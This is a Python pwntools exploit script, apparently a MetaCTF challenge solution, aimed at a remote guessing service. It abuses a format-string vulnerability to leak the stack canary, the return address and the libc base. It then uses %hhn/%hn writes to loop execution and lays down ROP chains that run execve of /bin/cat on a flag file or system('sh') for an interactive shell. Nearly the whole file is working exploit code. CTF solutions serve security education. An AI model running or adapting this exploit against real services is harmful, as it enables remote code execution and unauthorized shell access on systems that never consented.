import random
import time
import pwn
from struct import unpack


def main():
    config = setup("Go for it")
    #config = setup("Test")
    #config = setup("Debug")
    val = getFirstValue(config)
    config['garbage'] = val
    s, d = breakInLoop(config)
    config['s'] = s
    setupAttack(config, d)
    attack(config, d)
    # MetaCTF{N0w_7H47_iS_4N_EXPl0I7!}

def setup(runType):
    pwn.context.clear(arch = 'amd64')

    config = { 'runType': runType }
    if runType == "Debug":
        config['host'] = '127.0.0.1'
        config['port'] = 3006
        config['special_char'] = b'\xc8'
        config['parm'] = 25
        config['pad'] = b''
    elif runType == "Test":
        config['host'] = '127.0.0.1'
        config['port'] = 3005
        config['special_char'] = b'\xc8'
        config['parm'] = 25
        config['pad'] = b''
    else:
        config['host'] = 'host1.metaproblems.com'
        config['port'] = 5470
        config['special_char'] = b'\xc8'
        config['parm'] = 26
        config['pad'] = b'PPPPPPP.'
    return  config

def getFirstValue(config):
    # first pass does not include the special character, so that we can see what the original value is
    s = pwn.remote(config['host'], config['port'])
    d = s.recvuntil(b'?\n')
    payload_first  = f'PPPPPPPPPPPPPPP.%.16llx.'.encode('ascii') + config['pad']
    s.send(payload_first)
    try:
        s.recvuntil(b'Your guessed wrong with ')
        d = b''
        while True:  # until EOF
            d += s.recv(1)
    except EOFError as ex:
        s.close()
    except Exception as x:
        print(repr(x))
        s.close()
        quit()
    d = d[:-1]  # drop the final newline
    d = d.split(b'.', 1)
    d = d[1: ]  # discard first section
    addr_garbage = d[-1] + b'\x00\x00'
    addr_garbage = addr_garbage[-8: ]
    addr_garbage = unpack("Q", addr_garbage)[0]
    print("Addr Garbage", hex(addr_garbage))
    return addr_garbage

def breakInLoop(config):
    # try to break in
    payload_loop = f'%148c%{config["parm"]}$hhn.%.16llx.PPP'.encode('ascii') + config['pad'] + config['special_char']
    time.sleep(1)
    s = pwn.remote(config['host'], config['port'])
    d = s.recvuntil(b'?\n')
    while True:
        s.send(payload_loop)
        try:
            d = b''
            while True:
                d += s.recv(1)
                if b'What is your guess' in d:
                    break
            d += s.recvuntil(b'?\n')
            break
        except EOFError as ex:
            s.close()
            time.sleep(1)
            s = pwn.remote(config['host'], config['port'])
            d = s.recvuntil(b'?\n')
        except Exception as ex:
            print(repr(ex))
            print(d)
            s.close()
            time.sleep(1)
            s = pwn.remote(config['host'], config['port'])
            d = s.recvuntil(b'?\n')
    return s, d

def storeAtAddrs(config, firstParam, addr_values):
    result = buildFmtString(firstParam, addr_values)
    fmt, nextParam, adj_addr_values = result
    paramOfft = len(fmt) // 8
    for p in range(firstParam, nextParam):
        seek = f'%{p}$'.encode('ascii')
        repl = f'%{p + paramOfft}$'.encode('ascii')
        fmt = fmt.replace(seek, repl, 1)
    for av in adj_addr_values:
        addr, value, size = av
        fmt += pwn.p64(addr)
    print(fmt)
    if len(fmt) > 100: raise Exception('Format string too long')
    s = config['s']
    print(fmt)
    s.send(fmt)
    try:
        d = b''
        while True:
            d += s.recv(1)
            if b'guess?\n' in d:
                break
    except EOFError as eof:
        print(d)
        quit()
    except Exception as ex:
        print(d)
        print(ex)
        quit()
    return d

def buildFmtString(firstParam, addr_values):
    # order least value to greatest
    addr_values = sorted(addr_values, key=lambda x:x[1])
    # subtract prior values from subsequent values
    for i in range(len(addr_values) - 1):
        for j in range(i + 1, len(addr_values)):
            addr_values[j][1] -= addr_values[i][1]
    # build format portion of fmt string
    if firstParam < 10 or firstParam >= 100:
        raise Exception('This algorithm fails when format parameters are not within 10-99')
    parmNum = firstParam
    fmt = ''
    for av in addr_values:
        addr, value, size = av
        if not size in (1, 2, 4):  raise Exception('Only values of size 1, 2, and 4 work')
        width = 'h' if size == 2 else 'hh' if size == 1 else ''
        # no negative values
        value = value & 0xFFFFFFFF if size == 4 else value & 0xFFFF if size == 2 else value & 0xff
        if value:  fmt += f'%{value}c'
        fmt += f'%{parmNum}${width}n'
        parmNum += 1
    # pad fmt string to multiple of 8
    fmtLength = len(fmt)
    fmtLength = ((fmtLength + 7) // 8) * 8
    while len(fmt) < fmtLength:
        fmt += 'P'
    fmt = fmt.encode('ascii')
    return fmt, parmNum, addr_values



def storeByteAtAddr(config, addrs, values):  # up to 4 bytes with no return to main
    '22       23       24       25       26       27       28       29       30       31      32       '
    '%___c%__ $hhnPPPP ________ ________ ________ ________ ________ ________ ________ ________ ________'
    '%___c%__ $hhn%___ c%__$hhn ________ ________ ________ ________ ________ ________ ________ ________'
    '%___c%__ $hhn%___ c%__$hhn %___c%__ %hhnPPPP ________ ________ ________ ________ ________ ________'
    '%___c%__ $hhn%___ c%__$hhn %___c%__ %hhn%___ c%__$hhn ________ ________ ________ ________ ________'
    '12345678 90123456 78901234 56789012 34567890 12345678 90123456 78901234 56789012 34567890 12345678'
    '          1          2          3          4           5          6          7          8         '
    pass

def storeWordAtAddr(config, addrs, values):
    '22       23       24       25       26       27       28       29       30       31      32       '
    '%_____c% __$hnPPP ________ ________ ________ ________ ________ ________ ________ ________ ________'
    '%_____c% __$hn%__ ___c%__$ hnPPPPPP ________ ________ ________ ________ ________ ________ ________'
    '%_____c% __$hn%__ ___c%__$ hn%_____ c%__%hnP ________ ________ ________ ________ ________ ________'
    '%_____c% __$hn%__ ___c%__$ hn%_____ c%__%hn% _____c%_ _$hhnPPP ________ ________ ________ ________'
    '12345678 90123456 78901234 56789012 34567890 12345678 90123456 78901234 56789012 34567890 12345678'
    '          1          2          3          4           5          6          7          8         '
    pass


def storeValueAtAddr(config, addr, value):
    # The 100 byte limit allows 3 x 16 bit values to be written to 3 addrsses plus 1 x 8 bit value for calling main
    # This exploit needs to set one byte to jump back to main, 
    '22       23       24       25       26       27       28       29       30       31      32       '
    '%148c%__ $hhn$___ __c%__$h n%_____c %__$hn%_ ____c%__ $hnPPPPP ________ ________ ________ ________'
    '12345678 90123456 78901234 56789012 34567890 12345678 90123456 78901234 56789012 34567890 12345678'
    '          1          2          3          4           5          6          7          8         '
    val_buf = pwn.p64(value)
    tmp_addrs = [ [ addr+(2*idx), idx, unpack("H", val_buf[(2*idx) : (2*idx)+2])[0], 2] for idx in range(3)]
    tmp_addrs = sorted(tmp_addrs, key=lambda x: x[2])
    print(tmp_addrs)
    for i in range(len(tmp_addrs)-1):
        for j in range(i+1, len(tmp_addrs)):
            tmp_addrs[j][2] -= tmp_addrs[i][2]
    payload = b''
    for tmp in tmp_addrs:
        a, idx, count, size = tmp
        if size == 1:
            if not count:
                payload += f'%{idx+29}$hhn'.encode('ascii')
            else:
                payload += f'%{count}c%{idx+29}$hhn'.encode('ascii')
        else:
            if not count:
                payload += f'%{idx+29}$hn'.encode('ascii')
            else:
                payload += f'%{count}c%{idx+29}$hn'.encode('ascii')
    pad = b'P' * (7 * 8)
    payload += pad[ len(payload): ]
    tmp_addrs = sorted(tmp_addrs, key=lambda x: x[1])
    for tmp in tmp_addrs:
        a, idx, count, size = tmp
        payload += pwn.p64(a)
    s = config['s']
    print(payload)
    s.send(payload)
    try:
        d = b''
        while True:
            d += s.recv(1)
            if b'guess?\n' in d:
                break
    except EOFError as eof:
        print(d)
        quit()
    except Exception as ex:
        print(d)
        print(ex)
        quit()
    return d

def storeValueAtAddrAndCallMain(config, addr, value):
    # The 100 byte limit allows 3 x 16 bit values to be written to 3 addrsses plus 1 x 8 bit value for calling main
    # This exploit needs to set one byte to jump back to main, 
    '22       23       24       25       26       27       28       29       30       31      32       '
    '%148c%__ $hhn$___ __c%__$h n%_____c %__$hn%_ ____c%__ $hnPPPPP ________ ________ ________ ________'
    '12345678 90123456 78901234 56789012 34567890 12345678 90123456 78901234 56789012 34567890 12345678'
    '          1          2          3          4           5          6          7          8         '
    val_buf = pwn.p64(value)
    print(val_buf)
    tmp_addrs = [ [ addr+(2*idx), idx, unpack("H", val_buf[(2*idx) : (2*idx)+2])[0], 2] for idx in range(3)]
    tmp_addrs.append([config['addr_ret'], 3, 148, 1])
    tmp_addrs = sorted(tmp_addrs, key=lambda x: x[2])
    print(tmp_addrs)
    for i in range(len(tmp_addrs)-1):
        for j in range(i+1, len(tmp_addrs)):
            tmp_addrs[j][2] -= tmp_addrs[i][2]
    payload = b''
    for tmp in tmp_addrs:
        a, idx, count, size = tmp
        if size == 1:
            if not count:
                payload += f'%{idx+29}$hhn'.encode('ascii')
            else:
                payload += f'%{count}c%{idx+29}$hhn'.encode('ascii')
        else:
            if not count:
                payload += f'%{idx+29}$hn'.encode('ascii')
            else:
                payload += f'%{count}c%{idx+29}$hn'.encode('ascii')
    pad = b'P' * (7 * 8)
    payload += pad[ len(payload): ]
    tmp_addrs = sorted(tmp_addrs, key=lambda x: x[1])
    for tmp in tmp_addrs:
        a, idx, count, size = tmp
        payload += pwn.p64(a)
    s = config['s']
    print(payload)
    s.send(payload)
    try:
        d = b''
        while True:
            d += s.recv(1)
            if b'guess?\n' in d:
                break
    except EOFError as eof:
        print(d)
        quit()
    except Exception as ex:
        print(d)
        print(ex)
        quit()
    return d

def attack(config, d):
    print("attacking")
    addr = config['addr_workarea']

    # execve("/bin/cat", ["/bin/cat", "/fundamentals/flag2.txt"], 0)
    #
    # cat: b"/bin/cat" + b'\x00"*8
    # p1 : b"/fundamentals/flag2.txt\x00"
    # a  : cat
    #    : p1
    # PopRDI
    # cat
    # PopRSI
    # a
    # PopRDX
    # 0
    # PopRAX
    # 59
    # syscall

    pop_rsp = 0x0000000000023f50 + config['libc_base']
    pop_rax = 0x000000000003a638 + config['libc_base']
    syscall = 0x0000000000024104 + config['libc_base']
    pop_rsi = 0x000000000002440e + config['libc_base']
    pop_rdx = 0x0000000000106725 + config['libc_base']
    pop_rdi = 0x0000000000023a5f + config['libc_base']

    addr_cat = addr
    cat  = unpack("Q", b'/bin/c\x00\x00')[0]
    cat2 = unpack("Q", b'at\x00\x00\x00\x00\x00\x00')[0]
    p1   = unpack("Q", b'/funda\x00\x00')[0]
    p2   = unpack("Q", b'mental\x00\x00')[0]
    p3   = unpack("Q", b's/flag\x00\x00')[0]
    p4   = unpack("Q", b'2.txt\x00\x00\x00')[0]
    print("Addr cat", hex(addr_cat))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_cat, cat)
    d = storeValueAtAddrAndCallMain(config, addr_cat+6, cat2)
    addr += 16
    addr_p1 = addr
    d = storeValueAtAddrAndCallMain(config, addr_p1, p1)
    d = storeValueAtAddrAndCallMain(config, addr_p1+6, p2)
    d = storeValueAtAddrAndCallMain(config, addr_p1+12, p3)
    d = storeValueAtAddrAndCallMain(config, addr_p1+18, p4)
    addr += 24
    addr_a = addr
    d = storeValueAtAddrAndCallMain(config, addr_a, addr_cat)
    addr += 8
    d = storeValueAtAddrAndCallMain(config, addr_a+8, addr_p1)
    addr += 8

    print("wrote cat to workarea")

    addr_pop_rdi = addr 
    print("Addr Pop RDI", hex(addr_pop_rdi))
    print("Pop RDI", hex(pop_rdi))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_pop_rdi, pop_rdi)
    addr += 8
    print("wrote pop_rdi to workarea")

    addr_param = addr
    print("Addr Parameter", hex(addr_param))
    print("Parameter", hex(addr_cat))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_param, addr_cat)
    addr += 8
    print("wrote addr_cat to workarea")


    addr_pop_rsi = addr 
    print("Addr Pop RSI", hex(addr_pop_rsi))
    print("Pop RSI", hex(pop_rsi))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_pop_rsi, pop_rsi)
    addr += 8
    print("wrote pop_rsi to workarea")

    addr_param = addr
    print("Addr Parameter", hex(addr_param))
    print("Parameter", hex(addr_a))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_param, addr_a)
    addr += 8
    print("wrote addr_a to workarea")

    addr_pop_rdx = addr
    print("Addr Pop RDX", hex(addr_pop_rdx))
    print("Pop RDx", hex(pop_rdx))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_pop_rdx, pop_rdx)
    addr += 8
    print("wrote pop rdx to workarea")

    addr_param = addr
    print("Addr Parameter", hex(addr_param))
    print("Parameter", hex(0))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_param, 0)
    addr += 8
    print("wrote 0 to workarea")

    addr_pop_rax = addr
    print("Addr Pop RAX", hex(addr_pop_rax))
    print("Pop RAx", hex(pop_rax))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_pop_rax, pop_rax)
    addr += 8
    print("wrote pop rax to workarea")

    addr_param = addr
    print("Addr Parameter", hex(addr_param))
    print("Parameter", hex(59))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_param, 59)
    addr += 8
    print("wrote 59 to workarea")

    addr_syscall = addr
    print("Addr Syscall", hex(addr_syscall))
    print("Pop SyscallRAx", hex(syscall))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_syscall, syscall)
    addr += 8
    print("wrote syscall to workarea")

    addr_pop_rsp = config['addr_ret']
    pop_rsp = 0x23f50 + config['libc_base']
    print("Addr POP RSP", hex(addr_pop_rsp))
    print("Pop RSP", hex(pop_rsp))
    input("> ")
    seg_pop_rsp = pop_rsp >>16
    seg_rip = config['addr_rip'] >>16
    addr_values = []
    addr_values.append([addr_pop_rsp, pop_rsp & 0xffff, 2])
    if seg_pop_rsp != seg_rip:
        addr_values.append([addr_pop_rsp+2, (pop_rsp >> 16) & 0xff, 1])
    print("Addr POP RDI", hex(addr_pop_rdi))
    print("Pop RDI", hex(pop_rdi))
    input("> ")
    addr_values.append([(addr_pop_rsp+8), addr_pop_rdi & 0xFFFF, 2])
    addr_values.append([(addr_pop_rsp+8)+2, (addr_pop_rdi>>16) & 0xFFFF, 2])
    addr_values.append([(addr_pop_rsp+8)+4, (addr_pop_rdi>>32) & 0xFFFF, 2])
    d = storeAtAddrs(config, 22, addr_values)
    print("wrote addr_ret to workarea")
    s = config['s']
    d = b''
    try:
        while True:
            d += s.recv(1)
    except:
        print(d)





def attack2(config, d):
    print("attacking")
    addr = config['addr_workarea']

    addr_sh = addr
    sh = unpack("H", b'sh')[0]
    print("Addr Sh", hex(addr_sh))
    print("Sh", hex(sh))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_sh, sh)
    print("wrote sh to workarea")
    addr += 8

    addr_pop_rdi = addr 
    pop_rdi = 0x23a5f + config['libc_base']
    print("Addr Pop RDI", hex(addr_pop_rdi))
    print("Pop RDI", hex(pop_rdi))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_pop_rdi, pop_rdi)
    print("wrote pop_rdi to workarea")

    addr += 8
    addr_param = addr
    print("Addr Parameter", hex(addr_param))
    print("Parameter", hex(addr_sh))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_param, addr_sh)
    print("wrote addr_sh to workarea")

    addr += 8
    addr_system = addr
    print("Addr system", hex(addr_system))
    print("Parameter", hex(config['libc_system']))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_system, config['libc_system'])
    print("wrote system() to workarea")
    
    addr_pop_rsp = config['addr_ret']
    pop_rsp = 0x23f50 + config['libc_base']
    print("Addr POP RSP", hex(addr_pop_rsp))
    print("Pop RSP", hex(pop_rsp))
    input("> ")
    seg_pop_rsp = pop_rsp >>16
    seg_rip = config['addr_rip'] >>16
    addr_values = []
    addr_values.append([addr_pop_rsp, pop_rsp & 0xffff, 2])
    if seg_pop_rsp != seg_rip:
        addr_values.append([addr_pop_rsp+2, (pop_rsp >> 16) & 0xff, 1])
    print("Addr POP RDI", hex(addr_pop_rdi))
    print("Pop RDI", hex(pop_rdi))
    input("> ")
    addr_values.append([(addr_pop_rsp+8), addr_pop_rdi & 0xFFFF, 2])
    addr_values.append([(addr_pop_rsp+8)+2, (addr_pop_rdi>>16) & 0xFFFF, 2])
    addr_values.append([(addr_pop_rsp+8)+4, (addr_pop_rdi>>32) & 0xFFFF, 2])
    d = storeAtAddrs(config, 22, addr_values)
    print("wrote addr_ret to workarea")
    config['s'].interactive()


def attacki1(config, d):
    print("attacking")
    addr = config['addr_workarea']

    addr_sh = addr
    sh = unpack("H", b'sh')[0]
    print("Addr Sh", hex(addr_sh))
    print("Sh", hex(sh))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_sh, sh)
    print("wrote sh to workarea")
    addr += 8

    addr_pop_rdi = addr 
    pop_rdi = 0x23a5f + config['libc_base']
    print("Addr Pop RDI", hex(addr_pop_rdi))
    print("Pop RDI", hex(pop_rdi))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_pop_rdi, pop_rdi)
    print("wrote pop_rdi to workarea")

    addr += 8
    addr_param = addr
    print("Addr Parameter", hex(addr_param))
    print("Parameter", hex(addr_sh))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_param, addr_sh)
    print("wrote addr_sh to workarea")

    addr += 8
    addr_system = addr
    print("Addr system", hex(addr_system))
    print("Parameter", hex(config['libc_system']))
    input("> ")
    d = storeValueAtAddrAndCallMain(config, addr_system, config['libc_system'])
    print("wrote system() to workarea")

    
    d = storeValueAtAddr(config, config['addr_ret'], addr_pop_rdi)
    print("wrote addr_ret to workarea")
    config['s'].interactive()

def setupAttack(config, d):
    libc_system    = 0x449C0
    libc_sh        = 0x1607b5
    payload_canary = f'%148c%{config["parm"]}$hhn.%35$.16llx.'.encode('ascii') + config['pad'] + config['special_char']
    payload_rip    = f'%148c%{config["parm"]}$hhn.%37$.16llx.'.encode('ascii') + config['pad'] + config['special_char']
    payload_main   = f'%148c%{config["parm"]}$hhn.%41$.16llx.'.encode('ascii') + config['pad'] + config['special_char']
    payload_buffer = f'%148c%{config["parm"]}$hhn.%2$.16llx.p'.encode('ascii') + config['pad'] + config['special_char']

    # we've landed a payload that loops to start of main
    # read leaked stack address
    s = config['s']
    print(d)
    d = d.replace(b'Your guessed wrong with ',b'')
    index = d.index(b'\nWhat is your guess')
    d = d[ :index]
    d = d[149: ]
    d = d.split(b'.', 1)
    addr_lib = d[0]
    addr_lib = int(addr_lib.decode('ascii'), 16)
    addr_ret = d[-1] + b'\x00\x00'
    addr_ret = addr_ret[-8: ]
    addr_ret = unpack("Q", addr_ret)[0]
    config['addr_ret'] = addr_ret
    addr_stack = addr_ret + 8
    print("Addr Ret", hex(addr_ret))
    print("Addr Lib", hex(addr_lib))
    print("Addr Stk", hex(addr_stack))

    s.send(payload_canary)
    try:
        d = s.recvuntil(b'?\n')
        print(d)
        d = d.replace(b'Your guessed wrong with ',b'')
        index = d.index(b'\nWhat is your guess')
        d = d[ :index]
        d = d[149: ]
        d = d.split(b'.', 1)
        value_canary = d[0]
        value_canary = int(value_canary.decode('ascii'), 16)
        print("Canary", hex(value_canary))
    except Exception as ex:
        print(repr(ex))
        s.interactive()
    
    s.send(payload_rip)
    try:
        d = s.recvuntil(b'?\n')
        print(d)
        d = d.replace(b'Your guessed wrong with ',b'')
        index = d.index(b'\nWhat is your guess')
        d = d[ :index]
        d = d[149: ]
        d = d.split(b'.', 1)
        addr_rip = d[0]
        addr_rip = int(addr_rip.decode('ascii'), 16)
        print("Addr RIP", hex(addr_rip))
        config['addr_rip'] = addr_rip
    except Exception as ex:
        print(ex)
        s.interactive()
    
    s.send(payload_main)
    try:
        d = s.recvuntil(b'?\n')
        print(d)
        d = d.replace(b'Your guessed wrong with ',b'')
        index = d.index(b'\nWhat is your guess')
        d = d[ :index]
        d = d[149: ]
        d = d.split(b'.', 1)
        addr_main = d[0]
        addr_main = int(addr_main.decode('ascii'), 16)
        print("Addr Main", hex(addr_main))
        config['addr_main'] = addr_main
    except Exception as ex:
        print(ex)
        s.interactive()
    
    s.send(payload_buffer)
    try:
        d = s.recvuntil(b'?\n')
        print(d)
        d = d.replace(b'Your guessed wrong with ',b'')
        index = d.index(b'\nWhat is your guess')
        d = d[ :index]
        d = d[149: ]
        d = d.split(b'.', 1)
        addr_buffer = d[0]
        addr_buffer = int(addr_buffer.decode('ascii'), 16)
        print("Addr Buffer", hex(addr_buffer))
    except Exception as ex:
        print(ex)
        s.interactive()
    
    addr_libc = addr_rip - (0x23fb0+235)
    print("Addr Libc Base", hex(addr_libc))
    config['libc_base'] = addr_libc

    addr_system = addr_libc + libc_system
    print("Addr Libc System", hex(addr_system))
    config['libc_system'] = addr_system

    addr_workarea = config['addr_ret']
    addr_workarea >>= 16
    addr_workarea <<= 16
    print("Addr Workarea", hex(addr_workarea))
    config['addr_workarea'] = addr_workarea

    input('> ')

if __name__ == "__main__":
    main()

